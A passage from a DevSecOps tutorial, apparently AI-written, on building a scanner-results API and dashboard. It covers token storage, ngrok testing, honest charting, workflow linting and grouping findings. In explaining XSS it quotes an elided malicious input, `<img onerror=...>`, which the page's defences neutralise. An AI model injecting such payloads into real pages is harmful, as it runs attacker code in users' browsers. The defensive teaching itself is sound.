This server speaks plain HTTP, has no rate limiting or user accounts, and runs in one process on one file. Before real customers: HTTPS, a managed database (PostgreSQL), a framework such as FastAPI, rate limits, per-user login and token rotation. The design (tenants, tokens, validation, history) carries over unchanged. Also note that `--demo` fixtures return the same findings for either folder, so the example above shows the API working but not a real red-to-green; use real scanners for that.

### Check yourself

1. Why does each finding get a fingerprint?
2. Why does another project's scan return 404 instead of 403 (forbidden)?
3. Why store a hash of the token instead of the token?
4. Why should the upload step never change the exit code?
5. What does a `?` placeholder in SQL protect against?

**Answers.**
1. To recognise the same problem across scans, which is what makes "new" and "fixed" possible.
2. 403 would confirm that the scan exists. 404 reveals nothing about other tenants' data.
3. A leaked database then contains nothing an attacker can use as a login.
4. A reporting outage must not open or close the security gate; the verdict comes from the scan and policy only.
5. SQL injection: the database treats the value as data, never as SQL commands.

## Lesson 22: testing the API from the internet with ngrok

GitHub's machines cannot reach `127.0.0.1` on your laptop. **ngrok** opens a tunnel: it gives you a public `https://....ngrok-free.app` address that forwards to a port on your computer. That is enough to test the CI-to-API upload before paying for hosting.

Setup, once: create a free account at ngrok.com, install ngrok, run `ngrok config add-authtoken <your ngrok token>`.

Each session:
1. `python -m bridge.server serve --port 8080` (terminal 1)
2. `ngrok http 8080` (terminal 2). Copy the `https://...` forwarding address.
3. In GitHub: Settings > Secrets and variables > Actions > New repository secret. Add `SECUREBRIDGE_URL` (the ngrok address, no trailing slash) and `SECUREBRIDGE_TOKEN` (from `create-project`).
4. Push or re-run the workflow. The log shows `upload: saved as scan #N`.

Things to know:
- **The free address changes every time you restart ngrok.** Update the secret each time. A stable address is a reason to host properly later.
- **Secrets, not code.** The token lives in GitHub's secret store and reaches only the one step that needs it. Never paste it in the workflow file or a chat. If you ever do, make a new project and token.
- Your laptop must be on, with both terminals running, or the upload prints a warning and the scan still passes or blocks as normal.
- The tunnel makes your API reachable by anyone who has the address. Our token check and validation protect it, but this is a test setup: close ngrok when you finish, and use a throwaway project.
- Pull requests from forks never receive secrets, so they skip the upload. That is GitHub protecting your token.

**Check yourself.** (1) Why can't GitHub reach `127.0.0.1:8080`? (2) Why is the token a secret and not an `env:` value in the file? (3) What happens if your laptop is off during a run?

**Answers.** (1) It means "this same machine", and GitHub's runner is a different machine. (2) Workflow files are readable by everyone with repo access and stay in git history forever; secrets are masked in logs and scoped. (3) The upload fails with a warning; the verdict is unchanged.

## Lesson 25: the dashboard, and how to draw numbers honestly

Open `http://127.0.0.1:8080/dashboard` while the API runs (or the same path on your ngrok address), paste a project token, and press Connect. The page is one HTML file, `bridge/dashboard.html`, with no libraries and nothing loaded from other sites. It draws every chart itself as SVG.

### Why each chart exists

| Chart | Question it answers | Why this shape |
| --- | --- | --- |
| Four number tiles | "Are we OK right now?" | One current value needs a tile, not a chart. The verdict has an icon **and** a word, so colour never carries meaning alone. |
| Line: all vs blocking findings | "Is it getting better?" | Change over time is a line. Two series on **one** axis, never two scales. |
| Stacked columns: severity per scan | "What kind of problems?" | Part-to-whole per scan. Severity is ordered, so it uses **one hue from light to dark**, not a rainbow. |
| Bars above/below zero: new and fixed | "What changed since last time?" | Two opposite directions share a zero line. This is the chart that rewards the fingerprints from Lesson 21. |
| Horizontal bars by layer | "Where is the problem?" | The layer model (Lesson 13) made visible; every layer shows, even at zero, and the Running system says "no scanner yet" instead of a misleading 0. |
| Horizontal bars by scanner | "Which tool found what?" | Four identities, so four distinct colours, labelled directly. |
| Findings table with filters | "Show me the actual problems." | A chart tells you something is wrong; the table says what. |
| Scan history table | Everything again, as text | A **table view** for people who can't see colours, use a screen reader, or want exact numbers. |

### Honest charting rules used here

- **Start bars at zero.** A bar that starts at 90 makes 95 look like double.
- **One y-axis per chart.** Two scales on one chart let you make any two lines "correlate".
- **Colour follows meaning, not decoration.** Series colours were checked with a small script for colour-blind safety (the same colour pairs must stay apart for people with red-green colour blindness). Dark mode uses its own checked set, not an inverted copy.
- **Never rely on colour alone**: direct labels, a legend, icons plus words, and the table.
- **Hover shows the exact value**, and arrow keys work on the line chart for people not using a mouse.

### Security of a page that shows data

- **Untrusted text.** Finding titles come from scanners and uploads. If the page pasted them in as HTML, a malicious title like `<img onerror=...>` would run code in your browser (this is **XSS**, cross-site scripting). The page only ever sets `textContent`, which treats everything as plain text, and a test fails if `innerHTML` ever appears in the file.
- **Content-Security-Policy header.** The server tells the browser: only run this page's own script, only connect to this same server, never load anything else, and never appear inside another site's frame (that blocks **clickjacking**).
- **The page holds no data.** Anyone can load the HTML; without a token the API returns nothing. The token is kept in `sessionStorage`, which disappears when the tab closes, and Disconnect clears it. Never keep long-lived secrets in `localStorage`.
- The `/api/v1/insights` endpoint does all counting on the server and, like every query, only for your project.

### Check yourself

1. Why does the "new and fixed" chart need at least two scans?
2. Why show a table next to charts that already show the same numbers?
3. What is XSS, and what is the one habit in this page that prevents it?
4. Why is the Running system row not drawn as a bar of 0?

**Answers.**
1. "New" and "fixed" are differences between a scan and the one before it; one scan has nothing to compare with.
2. For accessibility and exactness: not everyone can read colours or judge a bar's height, and tables are searchable.
3. Attacker-controlled text running as code in someone's browser. Always insert data with `textContent`, never by building HTML strings.
4. 0 would say "scanned and clean". We have no scanner for that layer, so the honest label is "no scanner yet" (Lesson 13's "not scanned" vs "clean").

## Lesson 26: scan your own pipeline (and pin what you depend on)

In Lesson 17 we learned that the pipeline is a target: whoever controls your workflow file controls your secrets and your releases. SecureBridge now checks **its own** workflow. A new job, `workflow-lint`, runs `zizmor` on `.github/workflows/`: the real folder at the root of the repo. The deliberately broken specimen in `sample-app/` is untouched, because GitHub never runs it and it is scanned separately.

Changes made while preparing it:

- **`persist-credentials: false`** on every `actions/checkout`. By default checkout leaves a git password on disk for later steps; if a later step leaks the workspace (for example through an uploaded artifact, which zizmor reports as `artipacked`), that password leaks with it. We never push from these jobs, so we don't keep it. This is **least privilege** again.
- **Pinned scanner versions** (`gitleaks 8.30.1`, `trivy 0.76.1`, `opa 1.21.4`), copied from the "Versions to pin" block of a real run, so a new release can't change your results overnight. A test fails if one goes back to "latest".

**What I could not verify.** I cannot run zizmor here, so I don't know what it will say about the workflow. Expect it to be either green or to name specific lines. Two things it may mention: actions referenced by a version tag (`@v4`) instead of a full commit SHA, and `github/codeql-action`. A **commit SHA** can't be silently moved by the action's owner, a tag can (this is how the tj-actions attack in Lesson 17 worked). Pinning to SHAs is better but needs the exact hashes, and a wrong one breaks the pipeline, so we let the real zizmor output decide. Paste me the job's result and we will fix exactly what it says. Updating pinned SHAs by hand is tedious, which is why teams use Renovate or Dependabot to send those updates as pull requests.

### Check yourself

1. Why scan `.github/workflows/` and not `sample-app/` for this job?
2. What does `persist-credentials: false` take away, and why is that safe here?
3. Why can a tag like `@v4` be riskier than a commit SHA?

**Answers.**
1. The repo's own workflow is the one that really runs with your secrets; the sample-app specimen is inert test data.
2. The git password left in the checkout. Safe because none of our jobs push to the repository.
3. The owner (or an attacker with their access) can move a tag to new code; a SHA names exactly one version of the code forever.

## Lesson 27: findings are not problems (grouping)

A real run said "62 findings, 24 blocking". That sounds like weeks of work. Look closer: three different Semgrep rules fire on `app.py:28`, one line, and five CVEs in `flask` all say "upgrade flask". Fixing that one line, or that one library, clears several findings at once. The number a team really cares about is **how many places do I have to touch?**

`bridge/grouping.py` answers it with two deliberately simple rules:

- findings about a **library** group by the package (you fix them by upgrading it);
- everything else groups by **file and line** (several rules on one line are usually one edit).

You see it in three places: a "Things to fix" table in `report.md`, a `problems` list in `report.json`, and the dashboard's findings table, which now defaults to "Grouped by place to fix" (switch to "Every finding" for the full list). The CLI prints "62 finding(s) in N place(s) to fix".

### The rule that matters: group for display, never delete

Lesson 15 learned the hard way that merging findings early can hide a real one: a privileged container once vanished because it shared a line with a different rule. So grouping happens **after** the policy decision and only changes how things are shown. Every finding is still stored, counted, waivable and able to block. A test checks that the group counts always add up to the number of findings, and another that the verdict never changes.

### Honest limits

Two tools can describe the same flaw at different places: Trivy flags `Dockerfile` as a whole, Semgrep flags `Dockerfile:6`. Our rule can't link those. Linking them needs a hand-maintained table of "these rules mean the same thing", which is exactly what commercial ASPM tools maintain. If you ever build one, store it as data (like `policy.json`) and test it.

### Check yourself

1. Why is "number of findings" a poor measure of how much work is left?
2. Why do we group after the policy decision rather than before?
3. Name one case this grouping gets wrong.

**Answers.**
1. One fix can clear many findings, so the finding count overstates the work (and different findings need very different effort).
2. Grouping early could merge or hide a finding the policy should block; doing it afterwards cannot change the verdict.
3. The same flaw reported at different places by different tools (a whole-file finding and a line finding) stays as two places.

## Running the real scanners

Demo mode reads saved sample outputs from `fixtures/`. Those samples were written by hand
in each tool's output layout, so the real tools may report more, fewer or differently
worded results.

To use the real thing, install the four tools (see README), then:

```
python3 -m bridge scan sample-app
```

The engine runs each installed tool, loads its JSON output through the same adapters,
and the rest is identical. A tool that is not installed is reported as `skipped`.

**Honest caveat:** the exact command-line flags in `bridge/runner.py` were checked for
plumbing (a stand-in script played each tool) but not against the real programs, and
scanner flags change between versions. If a tool reports `failed`, read the detail
line in the report, compare with that tool's `--help`, and adjust `_command()`. That is
a normal part of this work.

## Small glossary for this phase

- **Pipeline (CI/CD):** automatic build, test and deploy steps that run when code changes.
- **Scanner:** a program that inspects code or config for known problems.
- **SAST:** scanning source code without running it.
- **CVE:** a public, numbered record of a known vulnerability.
- **SARIF:** a standard file format for scanner results.
- **Policy:** the rules that decide what is acceptable.
- **Waiver:** a documented, time-limited exception to a rule.
- **Exit code:** the number a program returns to say whether it succeeded.
- **Dedupe:** merging reports of the same problem.

## What comes next (phase 2)

Today the bridge runs on your laptop and the policy is a JSON file. Next:

1. Replace the JSON policy with OPA/Rego rules (real policy as code).
2. Put the bridge inside a GitHub Actions workflow so every pull request is scanned.
3. Store findings in a database behind a small API, which becomes the SaaS backend.
